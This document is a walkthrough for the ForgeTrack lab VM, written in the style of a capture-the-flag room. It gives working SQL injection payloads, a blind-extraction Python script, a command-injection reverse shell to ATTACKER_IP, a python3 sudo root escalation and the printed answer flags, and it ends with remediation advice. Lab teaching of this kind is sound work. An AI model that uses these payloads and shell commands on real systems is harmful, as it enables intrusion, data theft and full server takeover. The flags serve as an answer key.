# ForgeTrack — Full Room Walkthrough (VM edition)

> **Authorized lab material.** Everything below was designed for the isolated
> ForgeTrack VM built by `install.sh`. Do not run these payloads against any
> system you do not own or have written permission to test.

This walkthrough covers the **packaged Ubuntu 20.04.6 LTS VM**, not the local
dev server. The target is `http://VM_IP/`.

---

## 0. Access to the box

All four web challenges and the intended OS foothold are reachable through
the web application. The intended path is the command-injection bug in
section 7 — **no SSH credentials are required**.

> **Handler-only shortcut.** The build account `labadmin` still has SSH and
> sudo access. Do not publish this account in learner-facing material: it
> bypasses the web chain and gives immediate root. If you need it for
> maintenance:

```bash
ssh labadmin@VM_IP
hostname -I
```

---

## 1. Reconnaissance

```bash
nmap -sV -p- --min-rate 2000 VM_IP
```

Expected:

```text
22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu 20.04)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Only 80 and 22 should be reachable. PostgreSQL (5432) and Gunicorn (8080) are
bound to localhost and are not exposed.

```bash
curl -sSI http://VM_IP/
curl -sS http://VM_IP/ | grep -o 'Built for the next lap'
```

---

## 2. Map the application

| Page | Purpose |
|---|---|
| `/` | Dashboard |
| `/cars`, `/drivers`, `/events` | Public fleet and calendar |
| `/builds` | Released build registry |
| `/builds/search?query=` | Build search (vulnerable) |
| `/builds/view?id=N` | Build record (vulnerable) |
| `/telemetry` | Session list, gives valid codes |
| `/telemetry/check?session=` | Availability oracle (vulnerable) |
| `/secure/builds/search?query=` | Parameterised comparison route |
| `/diagnostics` | Network diagnostics (vulnerable) |
| `/login`, `/team-chat` | Authenticated team features |
| `/garage/manage`, `/drivers/manage` | Crew-only admin |

Baselines:

```bash
# normal search
curl -sS --get --data-urlencode "query=Apex" \
  http://VM_IP/builds/search | grep -o '<tr>.*</tr>'

# normal record
curl -sS 'http://VM_IP/builds/view?id=1' | grep -o '<h2>.*</h2>'

# valid telemetry code -> 200
curl -sS -o /dev/null -w '%{http_code}\n' --get \
  --data-urlencode "session=EMB-Q1-07" http://VM_IP/telemetry/check

# invalid code -> 404
curl -sS -o /dev/null -w '%{http_code}\n' --get \
  --data-urlencode "session=nope" http://VM_IP/telemetry/check
```

The record page renders **six columns**: `id`, `build_code`, `name`, `status`,
`car_code`, `notes`. Remember that number for the UNION step.

Valid session codes visible on `/telemetry`:

```text
EMB-Q1-07
EMB-Q1-12
MER-SH-18
```

---

## 3. Challenge 1 — Search SQL injection

**Answer:** `RFM{search_breach_confirmed}`

The vulnerable code:

```python
sql = ("SELECT b.id,b.build_code,b.name,b.status,c.car_code,COALESCE(b.notes,'') AS notes "
       "FROM builds b JOIN cars c ON c.id=b.car_id "
       "WHERE b.restricted=false AND (b.name ILIKE '%" + query + "%' "
       "OR b.build_code ILIKE '%" + query + "%') ORDER BY b.id")
```

### The naive payload fails

```sql
' UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='search' -- 
```

It returns **0 records** because the `UNION` lands inside the parenthesised
boolean expression, which PostgreSQL rejects. The app swallows the error.

### Working payload

Close the parenthesis first:

```sql
%' ) UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='search' -- 
```

```bash
curl -sS --get \
  --data-urlencode "query=%' ) UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='search' -- " \
  http://VM_IP/builds/search | grep -o 'RFM{[^}]*}'
```

```text
RFM{search_breach_confirmed}
```

Browser URL:

```text
http://VM_IP/builds/search?query=%25%27%20%29%20UNION%20SELECT%201%2Cchallenge%2Cflag_value%2C%27flag%27%2C%27lab%27%2C%27retrieved%27%20FROM%20flags%20WHERE%20challenge%3D%27search%27%20--%20
```

The flag appears as an extra table row: build code `search`, name `RFM{...}`,
status `flag`, car `lab`, notes `retrieved`.

**Why six values?** The original `SELECT` returns six columns. `UNION`
requires the same count and compatible types: one integer and five strings.

---

## 4. Challenge 2 — UNION record extraction

**Answer:** `RFM{the_forge_has_a_hidden_lane}`

Vulnerable code:

```python
sql = ("SELECT b.id,b.build_code,b.name,b.status,c.car_code,COALESCE(b.notes,'') "
       "FROM builds b JOIN cars c ON c.id=b.car_id WHERE b.id=" + build_id)
```

This is a numeric context, so no quote is needed. Use a non-matching id:

```sql
0 UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='union' -- 
```

```bash
curl -sS --get \
  --data-urlencode "id=0 UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='union' -- " \
  http://VM_IP/builds/view | grep -o 'RFM{[^}]*}'
```

```text
RFM{the_forge_has_a_hidden_lane}
```

Browser URL:

```text
http://VM_IP/builds/view?id=0%20UNION%20SELECT%201%2Cchallenge%2Cflag_value%2C%27flag%27%2C%27lab%27%2C%27retrieved%27%20FROM%20flags%20WHERE%20challenge%3D%27union%27%20--%20
```

Column mapping:

| Position | Normal meaning | Injected value |
|---|---|---|
| 1 | `id` | `1` |
| 2 | `build_code` | `challenge` |
| 3 | `name` | `flag_value` |
| 4 | `status` | `flag` |
| 5 | `car_code` | `lab` |
| 6 | `notes` | `retrieved` |

The page heading becomes `union · RFM{the_forge_has_a_hidden_lane}`.

### Optional side quest: the restricted build

The registry only lists `restricted=false`. Drop that predicate with a UNION to
read the hidden prototype:

```bash
curl -sS --get \
  --data-urlencode "id=0 UNION SELECT id,build_code,name,status,'hidden','notes' FROM builds WHERE restricted=true -- " \
  http://VM_IP/builds/view
```

That is not a flag, but it is the intended "hidden lane" flavour.

---

## 5. Challenge 3 — Blind boolean inference

**Answer:** `RFM{telemetry_never_stays_silent}`

Vulnerable code:

```python
sql = "SELECT 1 FROM telemetry WHERE session_code='" + session + "' LIMIT 1"
```

The page never prints a database value. The oracle is the status code:

- **200** — a row matched (`Archive record located`)
- **404** — no row (`No archive record`)

### Confirm the oracle

```bash
# true -> 200
curl -sS -o /dev/null -w '%{http_code}\n' --get \
  --data-urlencode "session=x' OR 1=1 -- " http://VM_IP/telemetry/check

# false -> 404
curl -sS -o /dev/null -w '%{http_code}\n' --get \
  --data-urlencode "session=x' OR 1=2 -- " http://VM_IP/telemetry/check
```

### Test a prefix

```bash
curl -sS -o /dev/null -w '%{http_code}\n' --get \
  --data-urlencode "session=x' OR (SELECT flag_value FROM flags WHERE challenge='blind') LIKE 'RFM{t%' -- " \
  http://VM_IP/telemetry/check
```

`RFM{t` → `200`; `RFM{z` → `404`.

### Manual loop

1. Start with `RFM{`.
2. Try `a–z`, `0–9`, `_`, `}`.
3. Send `LIKE '<prefix><candidate>%'`.
4. Keep the candidate that returns `200`.
5. Stop when `}` is confirmed.

`_` is a `LIKE` wildcard, so the automated version uses `substring()` equality
instead.

### Automated extraction

```python
import urllib.parse, urllib.request

BASE = "http://VM_IP/telemetry/check"
ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789_{}"

def matches(prefix):
    n = len(prefix)
    expr = f"(SELECT substring(flag_value,1,{n}) FROM flags WHERE challenge='blind')"
    payload = f"x' OR {expr} = '{prefix}' -- "
    url = BASE + "?" + urllib.parse.urlencode({"session": payload})
    try:
        with urllib.request.urlopen(url, timeout=5) as response:
            return response.status == 200
    except urllib.error.HTTPError as error:
        return error.code == 200

prefix = "RFM{"
while not prefix.endswith("}"):
    for character in ALPHABET:
        if matches(prefix + character):
            prefix += character
            print(prefix, flush=True)
            break
    else:
        raise SystemExit(f"no character matched after {prefix}")

print("FLAG:", prefix)
```

Output:

```text
FLAG: RFM{telemetry_never_stays_silent}
```

---

## 6. Challenge 4 — Remediation verification

**Answer:** `RFM{secure_build_verified}`

The secure route uses a parameterised query:

```python
results = rows(
    "SELECT ... WHERE b.restricted=false AND (b.name ILIKE %s OR b.build_code ILIKE %s) ORDER BY b.id",
    (f"%{query}%", f"%{query}%"),
)
```

Replay the Challenge 1 payload:

```bash
curl -sS --get \
  --data-urlencode "query=%' ) UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='search' -- " \
  http://VM_IP/secure/builds/search | grep -c 'RFM{'
```

```text
0
```

No injected row: the entire string is treated as a value, so `)` and `UNION`
cannot change the statement structure.

The room's remediation answer is `RFM{secure_build_verified}`. If your room
expects players to pull it from the database rather than be awarded it, the
same UNION path returns it:

```bash
curl -sS --get \
  --data-urlencode "query=%' ) UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='remediation' -- " \
  http://VM_IP/builds/search | grep -o 'RFM{[^}]*}'
```

```text
RFM{secure_build_verified}
```

---

## 7. Foothold — command injection in diagnostics

**Goal:** web app → shell as `www-data`.

Vulnerable code:

```python
# app/lab_diagnostics.py — INTENTIONALLY VULNERABLE
output = subprocess.check_output(
    f"ping -c 1 -W 2 {host}",
    shell=True,
    stderr=subprocess.STDOUT,
    text=True,
    timeout=10,
)
```

### Confirm execution

```bash
curl -sS --get --data-urlencode 'host=127.0.0.1; id' \
  http://VM_IP/diagnostics/ping | grep -oE 'uid=[0-9]+\([^)]*\)'
```

```text
uid=33(www-data)
```

On a dev host this returns your own user; on the VM it is `www-data` because
systemd runs Gunicorn as that account.

### Reverse shell

On your attack machine:

```bash
nc -lvnp 4444
```

Then:

```bash
curl -sS --get \
  --data-urlencode "host=127.0.0.1; nohup bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >/dev/null 2>&1 &" \
  http://VM_IP/diagnostics/ping
```

Base64 fallback if quoting breaks:

```bash
PAYLOAD=$(printf '%s' "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" | base64 -w0)
curl -sS --get \
  --data-urlencode "host=127.0.0.1; echo $PAYLOAD | base64 -d | bash &" \
  http://VM_IP/diagnostics/ping
```

### Upgrade the shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
export TERM=xterm
```

### User flag

```bash
id
cat /home/forge/user.txt
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
THM{f0rge_us3r_1881f0f3}
```

The file is `640 root:www-data`, so `www-data` can read it.

---

## 8. Privilege escalation — weak sudo rule

**Goal:** `www-data` → `root`.

### Enumerate

```bash
sudo -n -l
```

```text
User www-data may run the following commands on <hostname>:
    (root) NOPASSWD: /usr/bin/python3
```

### Exploit

```bash
sudo -n /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

### Root flag

```bash
cat /root/root.txt
```

```text
THM{f0rge_r00t_6d28fc4c}
```

The file is `400 root`, so only root can read it.

### Why it works

The sudo rule restricts the *binary*, not what the binary can do. Python is a
general-purpose interpreter, so `NOPASSWD: /usr/bin/python3` is effectively
`NOPASSWD: ALL`.

---

## 9. One-page command sheet

Ready-to-run scripts for every flag are in `docs/flag-scripts/`:

```bash
cd docs/flag-scripts
bash get-all-flags.sh http://VM_IP       # all six flags
bash get-web-flags.sh http://VM_IP       # four RFM{...} database flags
python3 get-blind-flag.py http://VM_IP   # blind flag only
bash get-os-flags.sh http://VM_IP        # user.txt + root.txt in one request
python3 get-reverse-shell.py http://VM_IP --attacker ATTACKER_IP
```

The raw copy-paste commands are in `docs/flag-scripts/COMMANDS.md`.

```bash
BASE=http://VM_IP
ATK=ATTACKER_IP

# Recon
nmap -sV -p- --min-rate 2000 VM_IP
curl -sS "$BASE/" | grep -o 'Built for the next lap'

# Challenge 1 — search
curl -sS --get --data-urlencode "query=%' ) UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='search' -- " "$BASE/builds/search"

# Challenge 2 — union
curl -sS --get --data-urlencode "id=0 UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='union' -- " "$BASE/builds/view"

# Challenge 3 — blind oracle
curl -sS -o /dev/null -w '%{http_code}\n' --get --data-urlencode "session=x' OR 1=1 -- " "$BASE/telemetry/check"

# Challenge 4 — remediation
curl -sS --get --data-urlencode "query=%' ) UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='search' -- " "$BASE/secure/builds/search" | grep -c 'RFM{'

# Foothold — confirm
curl -sS --get --data-urlencode 'host=127.0.0.1; id' "$BASE/diagnostics/ping"

# Foothold — reverse shell
curl -sS --get --data-urlencode "host=127.0.0.1; nohup bash -c 'bash -i >& /dev/tcp/$ATK/4444 0>&1' >/dev/null 2>&1 &" "$BASE/diagnostics/ping"
```

On the shell:

```bash
cat /home/forge/user.txt
sudo -n -l
sudo -n /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
id
cat /root/root.txt
```

---

## 10. Root cause and fix

| Route / control | Problem | Fix |
|---|---|---|
| `/builds/search` | `query` concatenated inside `ILIKE '%...%'` | Bind `%query%` as a parameter |
| `/builds/view` | `id` concatenated as a number | Bind it and cast with `int` |
| `/telemetry/check` | `session` concatenated inside quotes | Bind it as a parameter |
| `/diagnostics/ping` | `shell=True` with user input | Argument list without a shell; validate the host |
| `sudoers` | `NOPASSWD: /usr/bin/python3` for `www-data` | Remove interpreter sudo rights; use a fixed-argument wrapper |

```python
# vulnerable
sql = "... WHERE b.id=" + build_id

# fixed
record = rows("... WHERE b.id=%s", (build_id,))
```

Defence in depth used by the lab:

- Parameterised queries everywhere (`%s` with a tuple of values).
- Least privilege: `forge_app` has `SELECT/INSERT/UPDATE` but no `DELETE`, DDL,
  or superuser.
- Controlled error handling: database errors are logged, not shown. This hides
  information but does not fix injection.
- No dynamic identifiers from user input; map them through an allow-list.

---

## 11. Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `0 matching record(s)` for a UNION payload | `UNION` still inside the `(...)` group | Close it with `%' )` |
| Every request returns 500 | PostgreSQL unreachable | `systemctl status postgresql`, check `DATABASE_URL` |
| `502 Bad Gateway` | Gunicorn down | `journalctl -u forgetrack -n 50` |
| `/diagnostics` 404 | Old checkout without the blueprint | Ensure `app/lab_diagnostics.py` exists and is registered |
| `ping: command not found` | `iputils-ping` missing | `sudo apt install -y iputils-ping` |
| Injection returns `uid=1000(...)` | Dev server runs as your user | On the VM, systemd runs it as `www-data` |
| `sudo -n -l` asks for a password | Weak rule missing | Re-run the installer from the project checkout on the build host (the delivered VM no longer ships `install.sh`) |
| Blind script stalls on `_` | `_` is a `LIKE` wildcard | Use the `substring()` script |
| Web page unreachable from host | Firewall or NAT | `sudo ufw allow 80/tcp`; for VirtualBox NAT add a port forward |

---

## 12. Completion checklist

- [ ] Mapped the app and captured normal responses.
- [ ] Explained why the first search payload failed and fixed the parenthesis.
- [ ] Retrieved all four web flags.
- [ ] Explained the six-column UNION shape.
- [ ] Demonstrated the 200/404 blind oracle and automated it.
- [ ] Showed the secure route rejects the same input.
- [ ] Got a shell through `/diagnostics/ping` and identified `www-data`.
- [ ] Enumerated sudo and escalated to root through `python3`.
- [ ] Captured `/home/forge/user.txt` and `/root/root.txt`.
- [ ] Wrote up impact, root cause, and remediation with evidence.
